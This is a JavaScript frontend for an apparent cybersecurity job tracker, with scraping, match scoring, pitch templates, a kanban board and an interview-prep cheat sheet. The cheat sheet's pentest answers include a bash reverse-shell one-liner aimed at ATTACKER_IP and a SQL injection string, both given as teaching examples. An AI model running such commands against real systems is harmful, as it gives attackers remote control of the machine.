function hideAppliedJobs() {
  document.getElementById("applied-panel").classList.add("hidden");
  document.getElementById("applied-overlay").classList.add("hidden");
}

// ===== SCRAPE =====
async function triggerScrape() {
  const btn = document.querySelector(".btn-primary");
  if (btn) { btn.disabled = true; btn.textContent = "⟳ Scraping..."; }
  try {
    const res = await fetch("/api/scrape", { method: "POST" });
    const data = await res.json();
    showToast(data.status === "initiated" ? "⚡ Scrape started! Watch for new job alerts." : `⚠️ ${data.message}`, 4000);
  } catch(e) {
    showToast("❌ Scrape trigger failed", 3000);
  } finally {
    setTimeout(() => {
      if (btn) { btn.disabled = false; btn.textContent = "⚡ Scrape Now"; }
    }, 8000);
  }
}

// ===== CSV EXPORT =====
function exportCSV() {
  const params = new URLSearchParams();
  if (state.search) params.set("search", state.search);
  if (state.type) params.set("type", state.type);
  if (state.domain) params.set("domain", state.domain);
  if (state.seniority) params.set("seniority", state.seniority);
  if (state.location_scope) params.set("location_scope", state.location_scope);
  window.open(`/api/export/csv?${params}`, "_blank");
}

// ===== DRAWERS / MODALS =====
function toggleSourcesDrawer() {
  const drawer = document.getElementById("sources-drawer");
  const overlay = document.getElementById("sources-overlay");
  const isHidden = drawer.classList.contains("hidden");
  drawer.classList.toggle("hidden", !isHidden);
  overlay.classList.toggle("hidden", !isHidden);
  if (isHidden) loadSources();
}
function toggleShortcutsModal(forceClose = false) {
  const modal = document.getElementById("shortcuts-modal");
  if (forceClose) { modal.classList.add("hidden"); return; }
  modal.classList.toggle("hidden");
}

// ===== UTILITIES =====
function showToast(msg, duration = 2500) {
  const t = document.getElementById("toast");
  t.textContent = msg;
  t.classList.remove("hidden");
  setTimeout(() => t.classList.add("hidden"), duration);
}
function copyLink(url) {
  if (!url || url === "#") { showToast("⚠️ No link to copy", 2000); return; }
  navigator.clipboard.writeText(url).then(() => showToast("📋 Link copied!")).catch(() => showToast("❌ Could not copy"));
}
function escapeHtml(str) {
  if (!str) return "";
  return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}
function extractDomain(url) {
  try {
    const u = new URL(url);
    return u.hostname.replace(/^www\./, "");
  } catch { return null; }
}
function formatDate(iso) {
  if (!iso) return "";
  try {
    const d = new Date(iso);
    const diff = Math.floor((Date.now() - d.getTime()) / 1000);
    if (diff < 60) return "just now";
    if (diff < 3600) return `${Math.floor(diff/60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff/3600)}h ago`;
    return `${Math.floor(diff/86400)}d ago`;
  } catch { return iso.substring(0,10); }
}

// =========================================================================
// 🎯 RESUME & SKILLS KEYWORD MATCHER
// =========================================================================
function calculateMatchScore(job) {
  const skills = state.userSkills || [];
  if (!skills.length) return { score: 50, matched: [], missing: [] };

  const text = `${job.title || ''} ${job.description || ''} ${(job.domain_tags || []).join(' ')} ${(job.skills_required || []).join(' ')}`.toLowerCase();

  const matched = [];
  const missing = [];

  const cyberKeywords = [
    "linux", "python", "wireshark", "nmap", "burp suite", "splunk", "owasp",
    "tcp/ip", "siem", "soc", "kali linux", "iso 27001", "incident response", "git",
    "cloud security", "aws", "azure", "docker", "kubernetes", "sql", "cryptography",
    "reverse engineering", "malware", "vulnerability management", "mitre", "yara",
    "bash", "powershell", "firewall", "edr", "xdr", "identity", "iam", "zero trust",
    "network security", "endpoint security", "penetration testing", "threat hunting"
  ];

  const jobKeywords = cyberKeywords.filter(kw => text.includes(kw));

  skills.forEach(s => {
    const sLow = s.toLowerCase().trim();
    if (sLow && text.includes(sLow)) {
      matched.push(sLow);
    }
  });

  jobKeywords.forEach(kw => {
    if (!skills.some(s => s.toLowerCase().trim() === kw)) {
      missing.push(kw);
    }
  });

  let score = 55;
  if (jobKeywords.length > 0) {
    const hitCount = jobKeywords.filter(kw => skills.some(s => s.toLowerCase().trim() === kw)).length;
    score = Math.round((hitCount / jobKeywords.length) * 100);
  } else if (matched.length > 0) {
    score = Math.min(95, 60 + matched.length * 7);
  }

  score = Math.max(35, Math.min(98, score));
  return { score, matched: [...new Set(matched)], missing: [...new Set(missing)].slice(0, 5) };
}

function toggleProfileModal() {
  const modal = document.getElementById("profile-modal-overlay");
  const isHidden = modal.classList.contains("hidden");
  modal.classList.toggle("hidden", !isHidden);
  if (isHidden) {
    document.getElementById("user-skills-input").value = (state.userSkills || []).join(", ");
    renderQuickSkillsChips();
  }
}

function renderQuickSkillsChips() {
  const container = document.getElementById("quick-skills-chips");
  const popular = [
    "Linux", "Python", "Wireshark", "Burp Suite", "Nmap", "Splunk",
    "OWASP Top 10", "TCP/IP", "SIEM", "SOC", "Kali Linux", "ISO 27001",
    "Incident Response", "Git", "Cloud Security", "AWS", "Bash", "Docker",
    "Network Security", "Vulnerability Management", "Cryptography"
  ];
  container.innerHTML = popular.map(s => {
    const selected = (state.userSkills || []).some(us => us.toLowerCase() === s.toLowerCase());
    return `<span class="quick-chip ${selected ? 'selected' : ''}" onclick="toggleQuickSkill('${s}')">${s}</span>`;
  }).join("");
}

function toggleQuickSkill(skill) {
  const sLow = skill.toLowerCase();
  const exists = state.userSkills.some(us => us.toLowerCase() === sLow);
  if (exists) {
    state.userSkills = state.userSkills.filter(us => us.toLowerCase() !== sLow);
  } else {
    state.userSkills.push(sLow);
  }
  document.getElementById("user-skills-input").value = state.userSkills.join(", ");
  renderQuickSkillsChips();
}

function saveUserSkills() {
  const val = document.getElementById("user-skills-input").value;
  const parsed = val.split(/[,\n]+/).map(s => s.trim().toLowerCase()).filter(Boolean);
  state.userSkills = [...new Set(parsed)];
  localStorage.setItem("userSkills", JSON.stringify(state.userSkills));
  toggleProfileModal();
  showToast("💾 Saved skills! Updating match scores...");
  loadJobs();
}

function resetUserSkills() {
  state.userSkills = ["linux", "python", "wireshark", "nmap", "burp suite", "splunk", "owasp", "tcp/ip", "siem", "soc", "kali linux", "iso 27001", "incident response", "git"];
  localStorage.setItem("userSkills", JSON.stringify(state.userSkills));
  document.getElementById("user-skills-input").value = state.userSkills.join(", ");
  renderQuickSkillsChips();
  showToast("🔄 Reset to standard cyber student skills.");
}

// =========================================================================
// ⚡ INSTANT OUTREACH & COLD PITCH GENERATOR
// =========================================================================
function openPitchGenerator(jobId) {
  let job = state.jobCache[jobId];
  if (!job) {
    fetch(`/api/jobs/${jobId}`).then(r => r.json()).then(j => {
      state.jobCache[jobId] = j;
      state.currentJobForPitch = j;
      initPitchModal(j);
    });
    return;
  }
  state.currentJobForPitch = job;
  initPitchModal(job);
}

function initPitchModal(job) {
  state.currentPitchTab = "linkedin";
  document.getElementById("pitch-modal-title").textContent = `⚡ Outreach: ${job.company}`;
  document.getElementById("pitch-modal-sub").textContent = `${job.title} • ${job.location || 'Remote'}`;

  document.querySelectorAll("#pitch-tabs .pill").forEach(p => p.classList.remove("active"));
  const defTab = document.getElementById("ptab-linkedin");
  if (defTab) defTab.classList.add("active");

  renderPitchContent();
  document.getElementById("pitch-modal-overlay").classList.remove("hidden");
}

function closePitchModal() {
  document.getElementById("pitch-modal-overlay").classList.add("hidden");
}

function switchPitchTab(tab) {
  state.currentPitchTab = tab;
  document.querySelectorAll("#pitch-tabs .pill").forEach(p => p.classList.remove("active"));
  const activeBtn = document.getElementById(`ptab-${tab}`);
  if (activeBtn) activeBtn.classList.add("active");
  renderPitchContent();
}

function renderPitchContent() {
  const j = state.currentJobForPitch;
  if (!j) return;
  const textarea = document.getElementById("pitch-output");
  const skillsStr = (state.userSkills || []).slice(0, 4).join(", ");

  if (state.currentPitchTab === "linkedin") {
    textarea.value = `Hi there! I saw ${j.company} is hiring for the ${j.title} role. As an aspiring cybersecurity enthusiast with hands-on lab experience in ${skillsStr || "network defense and SIEM"}, I'd love to connect and briefly share how my proactive skills align with your security team!`;
  } else if (state.currentPitchTab === "email") {
    textarea.value = `Subject: Application: ${j.title} — [Your Name]

Dear ${j.company} Hiring Team,

I am writing to express my strong enthusiasm for the ${j.title} opportunity at ${j.company}.

As a motivated cybersecurity candidate, I have built direct, practical foundations through hands-on homelabs and CTF challenges:
• Technical proficiency in ${skillsStr || "Wireshark, Linux system analysis, and threat detection"}
• Familiarity with modern defense frameworks (MITRE ATT&CK, OWASP Top 10)
• Eager to contribute to live security monitoring, incident triage, and defensive operations

I have attached my resume and would welcome the opportunity to discuss how my technical curiosity and work ethic can support ${j.company}.

Best regards,
[Your Name]
[LinkedIn Profile] • [GitHub/Portfolio] • [Phone]`;
  } else {
    textarea.value = `Dear Hiring Manager,

Please accept my enthusiastic application for the ${j.title} position at ${j.company}. With a rigorous academic background in information security and continuous hands-on laboratory practice, I am eager to apply my technical drive to your team's cybersecurity posture.

During my independent and coursework lab exercises, I have developed competencies in:
1. Threat Analysis: Conducting packet inspection with Wireshark and analyzing logs across Linux and Windows environments.
2. Defensive Tooling: Practical experience using ${skillsStr || "SIEM platforms, vulnerability scanners (Nmap, Nessus), and baseline hardening"}.
3. Problem Solving: Participating in CTFs and researching real-world CVEs and threat vectors.

${j.company}'s reputation for excellence makes this the ideal environment for me to grow and contribute as a dedicated security team member. I look forward to the possibility of discussing this role with you.

Sincerely,
[Your Name]`;
  }
}

function copyPitchText() {
  const textarea = document.getElementById("pitch-output");
  navigator.clipboard.writeText(textarea.value).then(() => {
    showToast("📋 Pitch copied to clipboard!");
  }).catch(() => {
    textarea.select();
    document.execCommand("copy");
    showToast("📋 Copied!");
  });
}

function openRecruiterSearch(company) {
  const query = `${company} ("technical recruiter" OR "cybersecurity recruiter" OR "talent acquisition" OR "security manager")`;
  window.open(`https://www.linkedin.com/search/results/people/?keywords=${encodeURIComponent(query)}`, '_blank', 'noopener');
}

function openRecruiterSearchFromPitch() {
  if (state.currentJobForPitch) {
    openRecruiterSearch(state.currentJobForPitch.company);
  }
}

function openCompanyResearch(company, type) {
  if (type === 'levels') {
    const slug = company.toLowerCase().replace(/[^a-z0-9]/g, '-');
    window.open(`https://www.levels.fyi/companies/${encodeURIComponent(slug)}/salaries`, '_blank', 'noopener');
  } else if (type === 'glassdoor') {
    window.open(`https://www.glassdoor.com/Search/results.htm?keyword=${encodeURIComponent(company)}`, '_blank', 'noopener');
  }
}

function addFollowUpCalendar() {
  if (!state.currentJobForPitch) return;
  addFollowUpCalendarForJob(state.currentJobForPitch.id);
}

function addFollowUpCalendarForJob(jobId) {
  const j = state.jobCache[jobId];
  if (!j) return;
  const followUp = new Date();
  followUp.setDate(followUp.getDate() + 5);
  const dateStr = followUp.toISOString().replace(/-|:|\.\d+/g, "").slice(0, 8);
  const title = encodeURIComponent(`Follow Up: ${j.title} @ ${j.company}`);
  const details = encodeURIComponent(`Reach out to recruiter or hiring manager to follow up on application for ${j.title} at ${j.company}.\nDirect Link: ${j.apply_url || ''}`);
  const url = `https://calendar.google.com/calendar/render?action=TEMPLATE&text=${title}&details=${details}&dates=${dateStr}T100000Z/${dateStr}T103000Z`;
  window.open(url, '_blank', 'noopener');
}

// =========================================================================
// 📋 KANBAN PIPELINE BOARD
// =========================================================================
function renderKanban(jobs) {
  const stages = ["saved", "applied", "interviewing", "offer", "rejected"];
  const cols = {
    saved: document.getElementById("kb-col-saved"),
    applied: document.getElementById("kb-col-applied"),
    interviewing: document.getElementById("kb-col-interviewing"),
    offer: document.getElementById("kb-col-offer"),
    rejected: document.getElementById("kb-col-rejected")
  };

  stages.forEach(s => {
    if (cols[s]) cols[s].innerHTML = "";
  });

  const counts = { saved: 0, applied: 0, interviewing: 0, offer: 0, rejected: 0 };

  jobs.forEach(j => {
    let stage = state.kanbanStages[j.id];
    if (!stage) {
      stage = (j.applied || state.appliedIds.has(j.id)) ? "applied" : "saved";
    }
    if (counts[stage] === undefined) stage = "saved";
    counts[stage]++;

    const match = calculateMatchScore(j);
    const scoreBadge = match.score >= 75 ? 'badge-match-high' : match.score >= 55 ? 'badge-match-mid' : 'badge-match-low';

    const card = document.createElement("div");
    card.className = "kanban-card";
    card.innerHTML = `
      <div class="kanban-card-title">${escapeHtml(j.title)}</div>
      <div class="kanban-card-company">${escapeHtml(j.company)} • ${escapeHtml(j.location || 'Remote')}</div>
      <div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:6px">
        <span class="badge ${scoreBadge}">🎯 ${match.score}%</span>
        <span class="badge badge-type">${j.job_type === 'internship' ? '🎓' : '💼'}</span>
      </div>
      <div class="kanban-card-controls">
        <select class="kanban-stage-select" onchange="changeJobStage('${j.id}', this.value)">
          <option value="saved" ${stage === 'saved' ? 'selected' : ''}>📌 Saved</option>
          <option value="applied" ${stage === 'applied' ? 'selected' : ''}>📨 Applied</option>
          <option value="interviewing" ${stage === 'interviewing' ? 'selected' : ''}>💬 Interview</option>
          <option value="offer" ${stage === 'offer' ? 'selected' : ''}>🎉 Offer</option>
          <option value="rejected" ${stage === 'rejected' ? 'selected' : ''}>❌ Rejected</option>
        </select>
        <div style="display:flex;gap:4px">
          <button class="btn-sm" onclick="openPitchGenerator('${j.id}')" title="Pitch Generator">⚡</button>
          <a class="btn-sm" href="${escapeHtml(j.apply_url || '#')}" target="_blank" rel="noopener" title="Direct Apply">🔗</a>
        </div>
      </div>
    `;
    if (cols[stage]) cols[stage].appendChild(card);
  });

  stages.forEach(s => {
    const el = document.getElementById(`kb-count-${s}`);
    if (el) el.textContent = counts[s];
    if (cols[s] && !cols[s].children.length) {
      cols[s].innerHTML = `<div style="text-align:center;padding:24px;color:var(--text-muted);font-size:0.75rem">No opportunities in this stage</div>`;
    }
  });
}

function changeJobStage(jobId, newStage) {
  state.kanbanStages[jobId] = newStage;
  localStorage.setItem("kanbanStages", JSON.stringify(state.kanbanStages));
  if (newStage === "applied") {
    state.appliedIds.add(jobId);
    fetch(`/api/applications/${jobId}/apply`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}) });
  }
  showToast(`Stage updated to ${newStage.toUpperCase()}`);
  if (state.viewMode === "kanban") {
    renderKanban(Object.values(state.jobCache));
  }
}

// =========================================================================
// 📤 EXPORT: NOTION TABLE
// =========================================================================
function copyNotionTable() {
  const jobs = Object.values(state.jobCache);
  if (!jobs.length) {
    showToast("⚠️ No opportunities currently loaded", 2500);
    return;
  }
  let md = "| Opportunity | Company | Location | Type | Status | Apply Link |\n";
  md += "| :--- | :--- | :--- | :--- | :--- | :--- |\n";
  jobs.slice(0, 50).forEach(j => {
    const stage = state.kanbanStages[j.id] || (j.applied ? "Applied" : "Wishlist");
    md += `| ${j.title} | ${j.company} | ${j.location || 'Remote'} | ${j.job_type} | ${stage} | [Direct Apply](${j.apply_url || ''}) |\n`;
  });
  navigator.clipboard.writeText(md).then(() => {
    showToast("📋 Copied Notion-ready Markdown Table (50 rows)!");
  }).catch(() => {
    showToast("❌ Clipboard write denied", 2500);
  });
}

// =========================================================================
// 💡 TECHNICAL INTERVIEW PREP CHEAT SHEET
// =========================================================================
const INTERVIEW_DATA = {
  soc: [
    {
      q: "What is the difference between Windows Event ID 4624 and 4625?",
      a: "<code>4624</code> indicates a successful logon, whereas <code>4625</code> denotes a failed logon attempt. Look out for Logon Type 3 (Network logon) or Type 10 (RemoteInteractive/RDP). A sudden burst of 4625 followed by 4624 indicates a potential brute-force or password spraying compromise.",
      tip: "Mention Logon Types (2=Interactive, 3=Network, 10=RDP) to impress interviewers."
    },
    {
      q: "Explain the Incident Response Lifecycle (PICERL).",
      a: "1. <b>Preparation</b>: Tooling, training, baseline configs.<br>2. <b>Identification</b>: Detect alert via SIEM/EDR, triage false vs true positive.<br>3. <b>Containment</b>: Short-term isolation (quarantine host) & long-term mitigation.<br>4. <b>Eradication</b>: Remove malware, patch vulnerabilities, reset credentials.<br>5. <b>Recovery</b>: Restore systems, verify integrity, monitor closely.<br>6. <b>Lessons Learned</b>: Post-incident report, update detection rules.",
      tip: "Always emphasize that Containment comes BEFORE Eradication so attackers don't detect the cleanup and pivot."
    },
    {
      q: "How do you triage a suspicious phishing email?",
      a: "Analyze headers (RFC 822) for SPF, DKIM, DMARC alignment. Check sender envelope vs friendly display name. Extract URLs and defang them (e.g. <code>hxxp://...</code>) to submit to URLhaus / VirusTotal. Detonate attachments in an isolated sandbox (Any.Run / Cuckoo). If malicious, search SIEM for other recipients.",
      tip: "Remember to emphasize NEVER clicking links or opening attachments on your host machine."
    },
    {
      q: "What is the difference between an Indicator of Compromise (IoC) and an Indicator of Attack (IoA)?",
      a: "<b>IoC</b> is reactive forensic evidence that an attack already occurred (e.g., specific file hash, malicious IP, registry key modification). <b>IoA</b> focuses on the intent and behavioral tactics the attacker uses in real-time (e.g., mimikatz memory injection, persistence mechanism via scheduled task).",
      tip: "EDRs primarily detect IoAs (behavior), while traditional AV relies on IoCs (signatures)."
    }
  ],
  pentest: [
    {
      q: "How does SQL Injection work and how do you remediate it?",
      a: "SQLi occurs when untrusted user input is directly concatenated into a dynamic SQL query without sanitization. Attackers manipulate query structure (e.g., <code>' OR 1=1 --</code>).<br><b>Remediation</b>: Use Parameterized Queries (Prepared Statements) with bound parameters, stored procedures, and input validation.",
      tip: "Clarify that ORMs also need proper parameterized usage."
    },
    {
      q: "Explain Cross-Site Scripting (XSS) and its three primary types.",
      a: "XSS occurs when malicious scripts are injected into benign websites.<br>• <b>Stored (Persistent)</b>: Payload stored in database (e.g. comment field).<br>• <b>Reflected</b>: Payload reflected off the web server in an immediate response/URL parameter.<br>• <b>DOM-based</b>: Payload executed entirely within client-side JavaScript sink.<br><b>Defense</b>: Context-aware output encoding, Content Security Policy (CSP), <code>HttpOnly</code> cookie flags.",
      tip: "Highlight that HttpOnly cookies prevent session token theft via document.cookie."
    },
    {
      q: "What is the difference between a Bind Shell and a Reverse Shell?",
      a: "In a <b>Bind Shell</b>, the target victim opens a listening port and waits for the attacker to connect. In a <b>Reverse Shell</b>, the target victim initiates an outbound connection back to the attacker's listener. Reverse shells are preferred in pentesting because egress firewalls typically block inbound traffic but allow outbound connections.",
      tip: "Common reverse shell: <code>bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1</code>."
    }
  ],
  cloud: [
    {
      q: "What is the Principle of Least Privilege in AWS IAM?",
      a: "Granting users and services only the minimum necessary permissions required to perform their specific job functions, and for no longer than needed. Avoid wildcards (<code>*</code>), use IAM Roles instead of long-lived access keys, and employ Permission Boundaries and SCPs (Service Control Policies).",
      tip: "Mention AWS IAM Access Analyzer for identifying overly permissive roles."
    },
    {
      q: "What is the difference between an AWS Security Group and a Network ACL?",
      a: "<b>Security Group (SG)</b> operates at the EC2 instance level, is <i>stateful</i> (return traffic automatically allowed), and supports <i>allow</i> rules only. <b>NACL</b> operates at the subnet level, is <i>stateless</i> (must explicitly allow inbound and outbound), and evaluates rules in numerical order with support for both <i>allow</i> and <i>deny</i>.",
      tip: "Classic interview question! Emphasize 'stateful vs stateless'."
    },
    {
      q: "How do you detect and respond to an exposed AWS Access Key?",
      a: "1. Immediately deactivate or delete the exposed IAM access key in IAM console.<br>2. Check AWS CloudTrail logs for all API actions taken with that key ID.<br>3. Terminate any unauthorized resources (EC2 instances spun up for crypto-mining).<br>4. Rotate credentials and investigate the root cause (e.g. public git repository commit).",
      tip: "Mention AWS GitGuardian / Trufflehog integration for pre-commit scanning."
    }
  ],
  grc: [
    {
      q: "What is the difference between ISO 27001 and SOC 2 Type II?",
      a: "<b>ISO 27001</b> is a globally recognized standard certifying an organization's Information Security Management System (ISMS) framework. <b>SOC 2</b> is an attestation report based on AICPA Trust Services Criteria (Security, Availability, Confidentiality, etc.). A Type I report checks design at a point in time, while Type II evaluates operating effectiveness over a 6 to 12 month period.",
      tip: "ISO = certification; SOC 2 = auditor attestation report."
    },
    {
      q: "Explain the CIA Triad and give a violation example for each.",
      a: "• <b>Confidentiality</b>: Preserving authorized restrictions on access (e.g. data breach, unauthorized database dump).<br>• <b>Integrity</b>: Guarding against improper information modification or destruction (e.g. unauthorized tampering of bank balances or code injection).<br>• <b>Availability</b>: Ensuring timely, reliable access to information (e.g. DDoS attack, ransomware encryption of file servers).",
      tip: "Add 'Non-Repudiation' to show depth."
    }
  ],
  network: [
    {
      q: "Explain the TCP 3-Way Handshake.",
      a: "1. <b>SYN</b>: Client sends Synchronize packet with initial sequence number.<br>2. <b>SYN-ACK</b>: Server acknowledges client's SYN and sends its own SYN.<br>3. <b>ACK</b>: Client acknowledges server's SYN. Connection is established (ESTABLISHED state).<br>Teardown uses FIN / ACK / FIN / ACK.",
      tip: "A SYN Flood attack exploits half-open connections before the final ACK."
    },
    {
      q: "What are the common ports: 22, 53, 88, 389, 443, 3389?",
      a: "• <code>22</code>: SSH / SFTP<br>• <code>53</code>: DNS<br>• <code>88</code>: Kerberos authentication<br>• <code>389</code>: LDAP (Active Directory)<br>• <code>443</code>: HTTPS (TLS)<br>• <code>3389</code>: RDP (Remote Desktop Protocol)",
      tip: "Knowing Kerberos (88) and LDAP (389) immediately shows enterprise readiness."
    },
    {
      q: "What essential Linux commands do you use for incident triage?",
      a: "• <code>ss -tulnp</code> / <code>netstat -tulnp</code>: Active listening network sockets & processes.<br>• <code>ps auxf</code>: Process tree hierarchy to identify parent-child anomalies.<br>• <code>journalctl -xe</code> / <code>/var/log/auth.log</code>: Authentication and system logs.<br>• <code>crontab -l</code> / <code>/etc/cron*</code>: Scheduled persistence tasks.<br>• <code>last</code> / <code>w</code>: Recently logged-in users.",
      tip: "Mention that attackers frequently replace system binaries, so verify with <code>dpkg -V</code> or <code>rpm -V</code>."
    }
  ]
};

function toggleInterviewModal() {
  const modal = document.getElementById("interview-modal-overlay");
  const isHidden = modal.classList.contains("hidden");
  modal.classList.toggle("hidden", !isHidden);
  if (isHidden) {
    switchInterviewTab('soc');
  }
}

function switchInterviewTab(tab) {
  document.querySelectorAll("#interview-tabs .pill").forEach(p => p.classList.remove("active"));
  const btn = document.getElementById(`itab-${tab}`);
  if (btn) btn.classList.add("active");

  const container = document.getElementById("interview-content");
  const items = INTERVIEW_DATA[tab] || [];
  container.innerHTML = items.map((item, idx) => `
    <div class="cheat-item">
      <div class="cheat-q">Q${idx + 1}. ${escapeHtml(item.q)}</div>
      <div class="cheat-a">${item.a}</div>
      ${item.tip ? `<div class="cheat-tip">💡 Pro Tip: ${escapeHtml(item.tip)}</div>` : ''}
    </div>
  `).join("");
}

